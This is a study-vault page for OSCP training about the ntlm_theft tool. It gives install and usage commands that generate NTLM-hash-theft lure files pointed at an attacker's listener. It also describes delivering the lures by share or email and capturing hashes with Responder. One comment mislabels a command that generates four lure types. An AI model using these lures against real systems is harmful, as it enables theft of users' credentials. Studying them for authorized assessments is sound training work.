# ntlm_theft

Generates a whole batch of different NTLM-hash-theft lure file types (`.scf`, `.url`, `.lnk`, `.library-ms`, `desktop.ini`, Office documents, `.rtf`, and more) in one command, all pointed at the same listener.

---

## What it replaces, and why it's faster

[[12. Client-Side Attacks#Step 2: Build the Windows library file's XML|12.3.1]] hand-builds a single `.Library-ms` file's XML tag by tag (namespace, name, icon reference, folder type, search connector), genuinely worth doing manually once to understand what each tag actually means (see [[Client-Side Attacks (Breakdowns)|the tag-by-tag breakdown]]). `ntlm_theft` generates that same `.library-ms` lure, plus half a dozen other lure formats that all achieve a related goal (forcing an outbound SMB auth attempt when Explorer touches the file), in a single command, useful once the underlying XML mechanics are actually understood and the goal shifts to covering more delivery formats quickly, e.g. across a real assessment where you don't know in advance which lure type will get past a given target's filters.

## Install

```bash
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
```

## Usage

```bash
# Generate every supported lure type at once, pointed at your listener IP
python3 ntlm_theft.py -g all -s <kali_ip> -f lure

# Generate just the library-ms lure specifically (same file type 12.3.1 builds by hand)
python3 ntlm_theft.py -g scf,url,lnk,library-ms -s <kali_ip> -f lure
```
*Output lands in a `lure/` folder, one subfolder per file type. Drop any of them on a writable share (or deliver via email like the module's own `.Library-ms` workflow) and catch the NTLMv2 hash with `responder -I <interface>` once a victim's Explorer touches it, no double-click required for most of these formats, unlike the module's `.lnk`-triggers-a-reverse-shell chain, this whole family is specifically about forcing *authentication*, not code execution.*

## Where this applies in the vault

- [[12. Client-Side Attacks#Step 2: Build the Windows library file's XML|12.3.1]], as the multi-format complement to the module's hand-built single `.Library-ms` file
- Directly related to the CVE-2025-24054/24071 NTLM-leak note already flagged in [[12. Client-Side Attacks#Step 2: Build the Windows library file's XML|12.3.1]] (the "Worth knowing" callout after the delivery steps), `ntlm_theft`'s `library-ms` lure is exactly that technique, pre-built

#### Tags: #ModernTooling #NtlmTheft #NTLM #LibraryMs #WindowsLibraryFiles #Responder
## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

Ntlm_theft supports a repeatable task in an authorized assessment; knowing when to use it keeps the workflow deliberate rather than tool-led.

## Tool description

Ntlm_theft is a focused utility for the technique named by this page. Read its output as evidence and confirm important findings manually.

## Basic usage

Run the help screen first, then use the smallest command that answers the current question:

~~~bash
ntlm_theft --help
~~~

## Related RUNBOOK V2 stage

- [[RUNBOOK V2/Index]] -- route to the technique-specific stage after identifying the finding

## Related module

- [[MODULES/13. Locating Public Exploits]] -- understand the tool’s place in a controlled workflow
